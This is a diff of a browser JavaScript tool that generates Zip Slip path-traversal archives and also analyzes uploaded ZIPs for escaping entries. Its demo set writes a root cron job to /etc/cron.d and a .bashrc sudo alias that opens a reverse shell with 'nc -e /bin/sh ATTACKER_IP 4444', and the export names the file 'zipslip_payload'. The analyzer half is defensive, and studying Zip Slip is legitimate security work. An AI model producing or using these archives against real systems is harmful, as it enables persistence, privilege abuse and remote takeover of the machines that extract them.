+  toast("Loaded " + f.name + " (" + uploadSrc.bytes.length + " B)");
 });
 
-/* ---------- entries ---------- */
-/* ---------- overwrite path → archive entry name ---------- */
+/* ---------- Core Logic: No auto ../ prepending ---------- */
 function buildEntryName(fileName, dest) {
   const d = (dest || "").trim().replace(/\\/g, "/").replace(/\/+$/, "");
   if (!d) return { entry: fileName };
-  if (d.startsWith("/")) {
-    // absolute destination: standard 8-level traversal prefix guarantees escape
-    return { entry: "../".repeat(8) + d.replace(/^\/+/, "") + "/" + fileName };
-  }
-  // relative destination (may include raw ../) — used as-is
-  return { entry: d + "/" + fileName };
+  
+  // Paths are concatenated exactly as provided. 
+  // User must manually input "../" if relative traversal is required.
+  const sep = d.endsWith("/") ? "" : "/";
+  return { entry: d + sep + fileName };
 }
+
 function updatePreview() {
   const fileName = $("entry-name").value.trim();
   const dest = $("entry-dest").value.trim();
   if (!fileName) {
-    $("preview-entry").textContent = "→ archive entry: (enter a file name)";
-    $("preview-lands").textContent = "lands at: …";
+    $("preview-entry").textContent = "Archive entry: …";
+    $("preview-lands").textContent = "Resolves to: …";
     return;
   }
   const r = buildEntryName(fileName, dest);
-  $("preview-entry").textContent = "→ archive entry: " + r.entry;
-  $("preview-lands").textContent = dest.startsWith("/")
-    ? "overwrites / creates: " + dest + (dest.endsWith("/") ? "" : "/") + fileName
-    : (dest ? "lands at: " + dest + "/" + fileName + " (inside extraction dir)"
-            : "lands inside the extraction dir");
+  $("preview-entry").textContent = "Archive entry: " + r.entry;
+  $("preview-lands").textContent = "Resolves to: " + (dest ? dest + (dest.endsWith("/") ? "" : "/") + fileName : fileName);
 }
 ["entry-name", "entry-dest"].forEach(id => $(id).addEventListener("input", updatePreview));
 
@@ -530,13 +581,13 @@ $("cancel-entry").addEventListener("click", () => { $("entry-form").style.displa
 
 $("add-entry").addEventListener("click", () => {
   const fileName = $("entry-name").value.trim();
-  if (!fileName) { toast("Enter a file name first"); return; }
+  if (!fileName) { toast("Filename required"); return; }
   let data, srcLabel;
   if ($("src-text").classList.contains("active")) {
     data = enc.encode($("entry-content").value);
     srcLabel = "text · " + data.length + " B";
   } else {
-    if (!uploadSrc) { toast("Choose a file to embed first"); return; }
+    if (!uploadSrc) { toast("File required"); return; }
     data = uploadSrc.bytes;
     srcLabel = "file · " + data.length + " B";
   }
@@ -550,16 +601,13 @@ $("add-entry").addEventListener("click", () => {
   uploadSrc = null;
   $("entry-form").style.display = "none";
   renderEntries();
-  toast("Added " + fileName + " — " + entries.length + " file(s) in archive");
+  toast("Entry committed");
 });
-$("clear-entries").addEventListener("click", () => {
-  entries = [];
-  renderEntries();
-});
-function removeEntry(i) {
-  entries.splice(i, 1);
-  renderEntries();
-}
+
+$("clear-entries").addEventListener("click", () => { entries = []; renderEntries(); });
+
+function removeEntry(i) { entries.splice(i, 1); renderEntries(); }
+
 function renderEntries() {
   const list = $("entry-list");
   list.innerHTML = "";
@@ -568,62 +616,63 @@ function renderEntries() {
     const div = document.createElement("div");
     div.className = "entry";
     const escBadge = a.isAbs
-      ? '<span class="badge abs">ABSOLUTE</span>'
+      ? '<span class="badge abs">ABS</span>'
       : a.escapes
-        ? '<span class="badge escape">OVERWRITES</span>'
-        : '<span class="badge safe">IN TARGET</span>';
+        ? '<span class="badge escape">ESCAPE</span>'
+        : '<span class="badge safe">SAFE</span>';
     div.innerHTML =
       '<div><div class="path">' + escapeHtml(e.entry) + "</div>" +
       '<div class="meta">' + escapeHtml(e.fileName) + " · " + escapeHtml(e.srcLabel) +
-      (e.dest ? " · overwrite: " + escapeHtml(e.dest) : " · in target") + "</div></div>" +
+      (e.dest ? " · dest: " + escapeHtml(e.dest) : "") + "</div></div>" +
       '<div class="right">' + escBadge +
       '<button class="btn secondary small">Copy</button>' +
-      '<button class="btn danger small">Remove</button></div>';
+      '<button class="btn danger small">Del</button></div>';
     const [copyBtn, rmBtn] = div.querySelectorAll("button");
     copyBtn.addEventListener("click", () => copyText(e.entry));
     rmBtn.addEventListener("click", () => removeEntry(i));
     list.appendChild(div);
   });
 }
+
 function escapeHtml(s) {
   return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 }
 
-/* ---------- classic demo ---------- */
+/* ---------- demo payload (updated to show manual ../ usage) ---------- */
 $("load-demo").addEventListener("click", () => {
   entries = [
     { fileName: "update.txt", dest: "", entry: "update.txt", data: enc.encode("legit update file — stays inside the extraction directory\n"), srcLabel: "text · demo" },
-    { fileName: "evil", dest: "/etc/cron.d/", entry: "../../../../../../../../etc/cron.d/evil", data: enc.encode("* * * * * root /tmp/pwned\n"), srcLabel: "text · demo" },
-    { fileName: ".bashrc", dest: "/home/user/", entry: "../../../../../../../../home/user/.bashrc", data: enc.encode("alias sudo='sudo sh -c \"nc -e /bin/sh ATTACKER_IP 4444\"'\n"), srcLabel: "text · demo" }
+    { fileName: "evil.sh", dest: "../../../../../../../../etc/cron.d/", entry: "../../../../../../../../etc/cron.d/evil.sh", data: enc.encode("* * * * * root /tmp/pwned\n"), srcLabel: "text · demo" },
+    { fileName: ".bashrc", dest: "../../../../../../../../home/user/", entry: "../../../../../../../../home/user/.bashrc", data: enc.encode("alias sudo='sudo sh -c \"nc -e /bin/sh ATTACKER_IP 4444\"'\n"), srcLabel: "text · demo" }
   ];
-  $("target-dir").value = "/var/www/app/updates";
   renderEntries();
-  toast("Demo loaded — 3 files ready to generate");
+  toast("Demo vectors loaded");
 });
 
-/* ---------- generate ---------- */
+/* ---------- export ---------- */
 $("generate").addEventListener("click", () => {
-  if (!entries.length) { toast("Add at least one entry first"); return; }
+  if (!entries.length) { toast("No entries to compile"); return; }
   try {
     const blob = buildZip(entries);
     const a = document.createElement("a");
     a.href = URL.createObjectURL(blob);
-    a.download = (($("zip-name").value.trim() || "zipslip-demo").replace(/\.zip$/i, "")) + ".zip";
+    a.download = (($("zip-name").value.trim() || "zipslip_payload").replace(/\.zip$/i, "")) + ".zip";
     document.body.appendChild(a);
     a.click();
     a.remove();
     setTimeout(() => URL.revokeObjectURL(a.href), 5000);
-    toast("Generated " + a.download + " (" + blob.size + " bytes)");
+    toast("Archive compiled");
   } catch (e) {
-    toast("Download blocked in preview — works on GitHub Pages");
+    toast("Export blocked by sandbox");
   }
 });
+
 $("copy-list").addEventListener("click", () => {
-  if (!entries.length) { toast("No entries to copy"); return; }
+  if (!entries.length) { toast("No entries"); return; }
   copyText(entries.map(e => e.entry).join("\n"));
 });
 
-/* ---------- analyze mode ---------- */
+/* ---------- analyzer ---------- */
 $("upload-zip").addEventListener("change", async e => {
   const f = e.target.files[0];
   if (!f) return;
@@ -642,10 +691,10 @@ $("upload-zip").addEventListener("change", async e => {
       div.className = "entry";
       div.innerHTML =
         '<div><div class="path">' + escapeHtml(en.name) + "</div>" +
-        '<div class="meta">' + (en.method === 0 ? "stored" : "deflate") + " · " + en.uncompSize + " B uncompressed</div></div>" +
+        '<div class="meta">' + (en.method === 0 ? "STORE" : "DEFLATE") + " · " + en.uncompSize + " B</div></div>" +
         '<div class="right">' +
-        (a.isAbs ? '<span class="badge abs">ABSOLUTE</span>'
-          : dangerous ? '<span class="badge escape">TRAVERSAL ×' + a.escapeDepth + "</span>"
+        (a.isAbs ? '<span class="badge abs">ABS</span>'
+          : dangerous ? '<span class="badge escape">ESCAPE ×' + a.escapeDepth + "</span>"
           : '<span class="badge safe">SAFE</span>') +
         '<button class="btn secondary small">Copy</button></div>';
       div.querySelector("button").addEventListener("click", () => copyText(en.name));
@@ -655,9 +704,9 @@ $("upload-zip").addEventListener("change", async e => {
     $("ana-total").textContent = found.length;
     $("ana-safe").textContent = found.length - danger;
     $("ana-danger").textContent = danger;
-    toast("Parsed " + found.length + " entries");
+    toast("Analysis complete");
   } catch (err) {
-    toast("Error: " + err.message);
+    toast("Parse error: " + err.message);
   }
 });
 </script>
